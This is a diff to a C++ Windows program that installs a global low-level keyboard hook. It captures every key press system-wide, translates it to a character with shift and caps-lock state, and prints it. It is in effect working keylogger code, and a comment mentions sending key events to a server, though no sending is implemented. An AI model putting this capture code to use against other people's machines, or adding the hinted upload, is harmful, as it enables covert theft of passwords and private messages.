@@ -32,28 +32,41 @@ std::wstring VirtualKeyCodeToString(UCHAR virtualKey)
 // Keyboard hook procedure
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
-	if (nCode >= 0)
-	{
-		
-				
-		// Get the key code and key state
-		int keyCode = ((KBDLLHOOKSTRUCT*)lParam)->vkCode;
-
-		bool isKeyDown = (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN);
-
-		//Get the name of virtual key code
-		std::wstring name = VirtualKeyCodeToString(keyCode);
+	if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) //isKeyDown
+	{	
 
 		// Print the key code and character to the console OR // Send the key event to the server
 		//######################################################################################
-		if (isKeyDown) {
-			std::wcout << name << "\n";
-		}
+		KBDLLHOOKSTRUCT* pKeyboardStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
+		// Get the key code and key state
+		int keyCode = pKeyboardStruct->vkCode;
+		//Get the name of virtual key code
+		std::wstring name = VirtualKeyCodeToString(keyCode);
+		//Print out the key name
+		std::wcout << name << "\n"; //PRINT THE KEY NAME => OUTPUT IN A DIFFERENT WIDGET
+
 
 		
-		//######################################################################################
 
-		//std::cout << std::to_string((char)keyCode) << ((isKeyDown) ? " :down\n" : " :up\n");
+		// Get the keyboard state
+		SHORT shiftState = GetAsyncKeyState(VK_SHIFT);
+		SHORT capsLockState = GetKeyState(VK_CAPITAL);
+
+		// Convert the virtual key code to a character
+		BYTE keyboardState[256] = { 0 };
+		keyboardState[VK_SHIFT] = (shiftState & 0x8000) ? 0x80 : 0;
+		keyboardState[VK_CAPITAL] = (capsLockState & 0x0001) ? 0x01 : 0;
+
+		WCHAR charBuffer[2] = { 0 };
+		UINT scanCode = MapVirtualKeyEx(pKeyboardStruct->vkCode, MAPVK_VK_TO_VSC, GetKeyboardLayout(0));
+		int result = ToUnicodeEx(pKeyboardStruct->vkCode, scanCode, keyboardState, charBuffer, 2, 0, GetKeyboardLayout(0));
+
+		// Check if the characters were translated successfully
+		if (result > 0)
+		{
+			// Print the translated character message
+			std::wcout << "Translated Character Message: " << charBuffer << std::endl; //PRINT THE KEY CHARACTER => OUTPUT IN ANOTHER WIDGET
+		}		
 	}
 
 	// Call the next hook in the chain
@@ -75,3 +88,13 @@ void tracking_keyboard() {
 	// Remove the keyboard hook
 	UnhookWindowsHookEx(keyboardHook);
 }
+
+
+int main()
+{
+	tracking_keyboard();
+}
+
+
+
+
